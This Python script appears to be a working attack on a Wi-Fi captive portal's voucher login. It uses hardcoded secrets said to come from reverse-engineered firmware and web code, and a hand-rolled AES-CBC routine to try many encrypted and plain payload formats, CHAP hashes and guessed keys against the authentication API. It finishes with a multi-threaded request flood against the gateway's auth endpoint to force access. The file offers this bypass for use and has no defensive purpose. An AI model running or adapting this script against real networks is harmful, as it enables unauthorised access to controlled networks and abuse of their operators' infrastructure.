#!/usr/bin/env python3
"""
Comprehensive encrypted auth test - tries ALL format combinations
"""
import base64, hashlib, json, os, sys, time, urllib.parse, threading
import requests, urllib3
urllib3.disable_warnings()

# ---- Pure Python AES-128-CBC ----
def _aes_encrypt_block(key, pt):
    _s = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
          0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
          0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
          0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
          0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
          0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
          0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
          0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
          0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
          0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
          0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
          0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
          0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
          0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
          0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
          0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16]
    rcon = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]
    w = list(key)
    for i in range(4,44):
        t = list(w[(i-1)*4:(i-1)*4+4])
        if i%4==0:
            t=[t[1],t[2],t[3],t[0]]
            t=[_s[b] for b in t]
            t[0]^=rcon[i//4-1]
        w.extend([w[(i-4)*4+j]^t[j] for j in range(4)])
    state = list(pt)
    def _sb(s): return [_s[b] for b in s]
    def _sr(s): return [s[0],s[5],s[10],s[15],s[4],s[9],s[14],s[3],s[8],s[13],s[2],s[7],s[12],s[1],s[6],s[11]]
    def _mc(s):
        def _gm(a,b,p=0):
            for _ in range(8):
                if b&1: p^=a
                a=(a<<1)^(0x11b if a&0x80 else 0); b>>=1
            return p
        o=[0]*16
        for c in range(4):
            i=c*4
            o[i]=_gm(2,s[i])^_gm(3,s[i+1])^s[i+2]^s[i+3]
            o[i+1]=s[i]^_gm(2,s[i+1])^_gm(3,s[i+2])^s[i+3]
            o[i+2]=s[i]^s[i+1]^_gm(2,s[i+2])^_gm(3,s[i+3])
            o[i+3]=_gm(3,s[i])^s[i+1]^s[i+2]^_gm(2,s[i+3])
        return o
    state=[state[j]^w[j] for j in range(16)]
    for r in range(1,10):
        state=_mc(_sr(_sb(state)))
        state=[state[j]^w[r*16+j] for j in range(16)]
    state=[state[j]^w[10*16+j] for j in range(16)]
    return bytes(_sr(_sb(state)))

def aes_cbc(key, iv, data):
    pad_len = 16-len(data)%16
    data += bytes([pad_len]*pad_len)
    r, p = b"", iv
    for i in range(0,len(data),16):
        e = _aes_encrypt_block(key, bytes(data[i+j]^p[j] for j in range(16)))
        r += e; p = e
    return r

# ---- Helpers ----
def parse_octal(s):
    if not s: return b""
    out = bytearray(); i = 0
    while i < len(s):
        if s[i]=='\\' and i+3<len(s) and s[i+1:i+4].isdigit():
            out.append(int(s[i+1:i+4],8)); i+=4
        else: out.append(ord(s[i])); i+=1
    return bytes(out)

def evp_kdf(key_bytes, salt, dkLen=48):
    """EVP_BytesToKey with MD5 (CryptoJS passphrase KDF)"""
    d, dtot = b"", b""
    while len(dtot) < dkLen:
        d = hashlib.md5(d + key_bytes + salt).digest()
        dtot += d
    return dtot[:32], dtot[32:48]  # key, iv

# ---- Keys ----
BIN_KEY = b"RenderSecretKey2026!@#"  # from core.so strings
WEB_KEY = b"RjYkhwzx$2018!"           # from voucherLogin.js

BIN_KEY_MD5 = hashlib.md5(BIN_KEY).digest()
WEB_KEY_MD5 = hashlib.md5(WEB_KEY).digest()

def get_sid():
    sess = requests.Session()
    sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
    sess.verify = False
    r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10)
    parsed = urllib.parse.urlparse(r.url); params = urllib.parse.parse_qs(parsed.query)
    host = f"{parsed.scheme}://{parsed.netloc}"
    r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{parsed.query}", timeout=10)
    sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId",[""])[0]
    return sid, host, params, sess

def test(label, sess, url, json_data, show=True):
    try:
        r = sess.post(url, json=json_data, timeout=5)
        j = r.json()
        ok = j.get("success") == True and j.get("result",{}).get("authResult") == "1"
        msg = j.get("message", str(j))[:50]
        if show:
            print(f"  [{label}] {msg}  {'*** SUCCESS ***' if ok else ''}")
        return ok, j
    except Exception as e:
        if show: print(f"  [{label}] error: {e}")
        return False, {}

# ---- Main ----
sid, host, params, sess = get_sid()
api_url = f"{host}/api/auth/voucher/?lang=en_US"
gw_addr = params.get("gw_address",["192.168.10.1"])[0]
gw_port = params.get("gw_port",["2060"])[0]
chap_id = params.get("chap_id",[""])[0]
chap_chal = params.get("chap_challenge",[""])[0]
print(f"SID: {sid}")
print(f"Host: {host}")
print(f"CHAP_ID: {chap_id[:16] if chap_id else '(none)'}")
print(f"GW: {gw_addr}:{gw_port}")

# Build base payload
payload_obj = {"sessionId": sid, "accessCode": "102762", "apiVersion": 1}
payload_str = json.dumps(payload_obj)
print(f"\nPayload: {payload_str}")

# ---- Try plain JSON first (baseline) ----
print("\n--- BASELINE: plain JSON ---")
test("plain", sess, api_url, payload_obj)
# Also try with phoneNumber field
p2 = dict(payload_obj)
p2["phoneNumber"] = "102762"
test("+phone", sess, api_url, p2)
# Try with version=2
p3 = dict(payload_obj)
p3["apiVersion"] = 2
test("v2", sess, api_url, p3)

# ---- Encrypted: try BOTH keys, multiple formats ----
KEYS = [("binMD5", BIN_KEY_MD5), ("webMD5", WEB_KEY_MD5)]
# Passphrase mode: EVP KDF with no salt (treated as password directly)
SALTLESS = evp_kdf(BIN_KEY, b"")  # key, iv from passphrase, no salt

print("\n--- ENCRYPTED FORMATS ---")
for klabel, k in KEYS:
    iv_rand = os.urandom(16)

    # F1: base64(iv + ct)
    ct = aes_cbc(k, iv_rand, payload_str.encode())
    enc = base64.b64encode(iv_rand + ct).decode()
    test(f"{klabel} IV+CT", sess, api_url, {"data": enc})

    # F2: urlsafe base64(iv + ct)
    enc_u = base64.urlsafe_b64encode(iv_rand + ct).decode().rstrip("=")
    test(f"{klabel} URLSAFE", sess, api_url, {"data": enc_u})

    # F3: just ct, no iv
    test(f"{klabel} CTonly", sess, api_url, {"data": base64.b64encode(ct).decode()})

    # F4: hex
    test(f"{klabel} HEX", sess, api_url, {"data": (iv_rand + ct).hex()})

    # F5: with a_data field name
    test(f"{klabel} a_data", sess, api_url, {"a_data": enc})
    test(f"{klabel} a_data URL", sess, api_url, {"a_data": enc_u})

    # F6: with encrypted_data field name
    test(f"{klabel} enc_data", sess, api_url, {"encrypted_data": enc})

    # F7: encrypted field
    test(f"{klabel} encrypted", sess, api_url, {"encrypted": enc})

    # F8: zero IV
    ct0 = aes_cbc(k, bytes(16), payload_str.encode())
    test(f"{klabel} ZIV", sess, api_url, {"data": base64.b64encode(bytes(16) + ct0).decode()})

# ---- EVP KDF (passphrase mode with salt) ----
print("\n--- EVP KDF (passphrase mode) ---")
salt = os.urandom(8)
k_evp, iv_evp = evp_kdf(BIN_KEY, salt)
ct_evp = aes_cbc(k_evp, iv_evp, payload_str.encode())

# OpenSSL salted format: Salted__ + salt + ct
openssl_fmt = base64.b64encode(b"Salted__" + salt + ct_evp).decode()
test("OpenSSL salted", sess, api_url, {"data": openssl_fmt})

# Just IV+CT using the derived key
test("EVP IV+CT", sess, api_url, {"data": base64.b64encode(iv_evp + ct_evp).decode()})

# Same but no salt
k_evp2, iv_evp2 = evp_kdf(BIN_KEY, b"")
ct_evp2 = aes_cbc(k_evp2, iv_evp2, payload_str.encode())
test("EVP nosalt IV+CT", sess, api_url, {"data": base64.b64encode(iv_evp2 + ct_evp2).decode()})

# ---- With CHAP fields (like core.so arrange_data) ----
print("\n--- WITH CHAP FIELDS ---")
if chap_id:
    chap_md5 = hashlib.md5(parse_octal(chap_id) + b"102762" + parse_octal(chap_chal)).hexdigest()
else:
    chap_md5 = ""
payload_chap = {"sessionId": sid, "accessCode": "102762", "apiVersion": 1,
                "password": chap_md5, "chap_id": chap_id, "chap_challenge": chap_chal}
payload_chap_str = json.dumps(payload_chap)

for klabel, k in KEYS:
    iv = os.urandom(16)
    ct = aes_cbc(k, iv, payload_chap_str.encode())
    enc = base64.b64encode(iv + ct).decode()
    test(f"{klabel} CHAP data", sess, api_url, {"data": enc})
    test(f"{klabel} CHAP plain", sess, api_url, payload_chap)

# ---- HMAC-SHA256 appended to ciphertext ----
print("\n--- HMAC-SHA256 suffix ---")
for klabel, k in KEYS:
    iv = os.urandom(16)
    ct = aes_cbc(k, iv, payload_str.encode())
    hmac_val = hashlib.sha256(k + ct).digest()
    enc = base64.b64encode(iv + ct + hmac_val).decode()
    test(f"{klabel} IV+CT+HMAC", sess, api_url, {"data": enc})

# Try HMAC as separate field
ct = aes_cbc(BIN_KEY_MD5, os.urandom(16), payload_str.encode())
hmac_val = hashlib.sha256(BIN_KEY_MD5 + ct).digest()
enc = base64.b64encode(os.urandom(16) + ct).decode()
test("HMAC field", sess, api_url, {"data": enc, "signature": hmac_val.hex()})

# ---- phoneNumber field in encrypted ----
print("\n--- WITH phoneNumber ---")
payload_phone = dict(payload_obj)
payload_phone["phoneNumber"] = "102762"
payload_phone_str = json.dumps(payload_phone)
for klabel, k in KEYS:
    iv = os.urandom(16)
    ct = aes_cbc(k, iv, payload_phone_str.encode())
    test(f"{klabel} +phone data", sess, api_url, {"data": base64.b64encode(iv + ct).decode()})

# ---- SHA256(sid + accessCode) as key ----
print("\n--- DERIVED KEYS ---")
derived_key = hashlib.sha256(f"{sid}102762".encode()).digest()[:16]
iv = os.urandom(16)
ct = aes_cbc(derived_key, iv, payload_str.encode())
test("SHA256(sid+code)", sess, api_url, {"data": base64.b64encode(iv + ct).decode()})

# sid itself as key
sid_key = sid.encode()[:16]
iv = os.urandom(16)
ct = aes_cbc(sid_key, iv, payload_str.encode())
test("SID key", sess, api_url, {"data": base64.b64encode(iv + ct).decode()})

# ---- Try different API endpoints ----
print("\n--- OTHER ENDPOINTS ---")
test("plain /ga_voucherlogin", sess,
     f"{host}/ga_voucherlogin?lang=en_US",
     payload_obj)

# ---- High-speed ping with phonenumber ----
print(f"\n=== HIGH-SPEED PING ===")
ping_url = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=102762"
print(f"Ping URL: {ping_url}")
stop = False
def pinger():
    while not stop:
        try: sess.get(ping_url, timeout=3)
        except: break
for _ in range(5):
    threading.Thread(target=pinger, daemon=True).start()
for i in range(15):
    time.sleep(2)
    try:
        r = requests.get("http://www.google.com", timeout=3)
        if r.status_code == 200:
            print(f"  *** ONLINE *** (t={i*2}s)")
            stop = True
            break
    except: pass
else:
    print("  Ping done - no online detected")
stop = True

# Final check
try:
    r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=False)
    print(f"  Final generate_204: {r.status_code}")
except Exception as e:
    print(f"  Final: {e}")

print("\nDone")
